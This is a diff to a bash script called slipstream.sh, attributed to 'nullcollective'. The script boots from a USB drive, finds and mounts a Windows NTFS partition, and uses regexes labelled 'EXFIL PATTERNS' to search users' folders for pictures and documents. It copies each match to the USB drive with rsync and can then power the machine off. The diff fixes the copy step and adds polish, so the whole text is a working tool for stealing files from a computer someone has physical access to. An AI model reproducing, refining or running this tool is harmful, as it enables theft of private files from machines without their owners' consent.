@@ -5,7 +5,7 @@
 # Best when combined with buildroot on a USB drive
 ####################################################################
 # Usage: ./slipstream.sh
-# Depends on [root for mounting]
+# Depends on [root,rsync,coreutils,lsblk,parted,bash,awk,grep]
 ####################################################################
 # Copyright 2025 nullcollective
 #
@@ -22,6 +22,7 @@
 # limitations under the License.
 
 # Currently only supports Windows 10/11 Target Partition Detection
+clear -x
 
 #-------------------
 # USER VARIABLES
@@ -29,7 +30,8 @@
 
 # DRIVE INFO
 # Used to detect USB data drive
-USB_LABEL="slipstream_data"
+# Add Label to partition
+USB_LABEL="data"
 # Where to mount your target's drive to
 TARGET_MOUNT="/mnt/win"
 # Where to mount your USB data drive to
@@ -45,6 +47,8 @@ SEARCH="PICS DOCS"
 SEARCH_DEPTH="4"
 # TARGET+BASE (ie: /mnt/win/Users)
 BASE_SEARCH_PATH="/Users"
+# Poweroff After Completion
+poweroff_device="false"
 
 # EXFIL PATTERNS
 PICS='.*/.*\.(jpg|jpeg|png|gif)$'
@@ -58,6 +62,8 @@ OTHER='.*/.*\.(bak|tmp|log)$'
 #-------------------------------------------------------
 # DO NOT EDIT BELOW UNLESS YOU NEED TO ADJUST THE CODE
 #-------------------------------------------------------
+
+echo -e "+++ slipstream by nullcollective +++\n"
 
 # VERIFY ELEVATED PRIVS / REQUIRED FOR MOUNTING DRIVES
 if [[ "$UID" -ne 0 ]]; then
@@ -85,7 +91,7 @@ echo "[>] MOUNT PATHS CHECK PASSED"
 
 # DETECT WINDOWS PARTITION
 for disk in $(lsblk -dn -o NAME,TYPE | awk '$2 == "disk" { print "/dev/" $1 }');do
-	part=$(sudo parted -m "${disk}" print | grep -i 'ntfs.*Basic data partition' | cut -d: -f1)
+	part=$(parted -m "${disk}" print | grep -i 'ntfs.*Basic data partition' | cut -d: -f1)
 	if [[ -n "$part" ]]; then
 		TARGET_DISK=$(echo "$disk"p"$part")
 		break
@@ -116,9 +122,9 @@ mount -o ro ${TARGET_DISK} ${TARGET_MOUNT} || { exit 1; }
 # MOUNT EXFIL USB PARTITION (R/W)
 # Fast Options Enabled for faster unmounting
 mount -o sync,noatime,nodiratime ${USB_DISK} ${USB_MOUNT} || { exit 1; }
-echo "[>] Drives Mounted"
+echo "[>] DRIVES MOUNTED"
+echo "[>] slipstreaming file(s) from ${TARGET_DISK} to ${USB_DISK}"
 echo "-------------------------------------------------"
-
 #-------------------------------------------------------
 # EXFIL PROCESSING
 #-------------------------------------------------------
@@ -132,15 +138,18 @@ for filetype in ${SEARCH};do
                                 -regex ${pattern} | \
                                 while read -r foundfile; do
 					echo "[discovered] ${foundfile}"
-                                        rsync -Rah --protect-args --info=progress2 "${foundfile}" "${USB_DRIVE}/"
+                                        rsync -Rah --protect-args --info=progress2 "${foundfile}" "${USB_MOUNT}/"
         done
 done
-
-echo "[>] COMPLETE"
+echo "-------------------------------------------------"
 # UNMOUNT USB AND TARGET PARTITIONS
-umount ${USB_MOUNT}
-umount ${TARGET_MOUNT}
+echo "[>] UMOUNTING DRIVES..."
+umount ${USB_MOUNT} ; echo "[>>>] USB UNMOUNTED"
+umount ${TARGET_MOUNT} ; echo "[>>>] TARGET DRIVE UNMOUNTED"
+echo "[>] COMPLETE"
 
 # SHUTDOWN SYSTEM (optional)
-# poweroff
+if [ "${poweroff_device}" = "true" ]; then
+	poweroff
+fi
 exit 0
